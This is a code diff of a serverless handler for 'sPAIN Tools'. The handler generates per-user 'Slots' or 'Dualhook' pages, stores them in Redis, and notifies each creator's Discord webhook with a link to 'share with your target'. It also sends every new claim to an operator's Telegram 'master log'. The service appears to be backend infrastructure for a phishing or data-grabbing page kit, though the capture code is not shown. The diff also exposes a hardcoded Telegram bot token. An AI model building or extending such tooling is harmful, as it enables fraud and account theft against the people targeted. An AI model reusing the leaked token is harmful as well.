@@ -4,19 +4,21 @@ const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
+// Upstash REST: GET /get/key
 async function redisGet(key) {
   const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
     headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
   });
   const json = await res.json();
-  return json.result;
+  return json.result; // raw string or null
 }
 
+// Upstash REST: POST /set/key/value  (value goes IN THE URL, not body)
 async function redisSet(key, value) {
-  const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
+  const encoded = encodeURIComponent(JSON.stringify(value));
+  const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encoded}`, {
     method: 'POST',
-    headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
-    body: JSON.stringify({ value: JSON.stringify(value) })
+    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
   });
   return res.ok;
 }
@@ -70,25 +72,25 @@ export default async function handler(req, res) {
     if (existing !== null) return res.status(200).json({ taken: true });
 
     const record = {
-      slug,
-      displayName:    displayName || slug,
-      webhook,                          // this page's own webhook
-      inviteUrl:      inviteUrl  || '',
-      charUrl:        charUrl    || '',
+      slug:           slug,
+      displayName:    displayName && displayName.trim() ? displayName.trim() : slug,
+      webhook:        webhook,
+      inviteUrl:      inviteUrl      || '',
+      charUrl:        charUrl        || '',
       type:           type === 'dualhook' ? 'dualhook' : 'slots',
-      dualhookParent: dualhookParent || '', // slug of the dualhook page that spawned this
+      dualhookParent: dualhookParent || '',
       createdAt:      new Date().toISOString()
     };
 
     const ok = await redisSet(`slot:${slug}`, record);
-    if (!ok) return res.status(500).json({ error: 'Failed to save' });
+    if (!ok) return res.status(500).json({ error: 'Failed to save to Redis' });
 
     const url = `https://spain-tools.vercel.app/${slug}`;
 
-    // ── Notify creator's webhook with their generated link ──────────────────
-    const embed = {
+    // Notify creator's Discord with their generated link
+    await notifyDiscord(webhook, {
       title: `✅ Your ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
-      description: `**Share this link:**\n${url}`,
+      description: `**Share this link with your target:**\n${url}`,
       color: record.type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
       fields: [
         { name: '📁 Slug', value: `\`${slug}\``, inline: true },
@@ -97,10 +99,9 @@ export default async function handler(req, res) {
       ],
       footer: { text: 'sPAIN Tools — Keep this webhook private!' },
       timestamp: new Date().toISOString()
-    };
-    await notifyDiscord(webhook, embed);
+    });
 
-    // ── Telegram master log ─────────────────────────────────────────────────
+    // Telegram master log
     await tgSend([
       `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} claimed!</b>`,
       `📁 Slug: <code>${slug}</code>`,
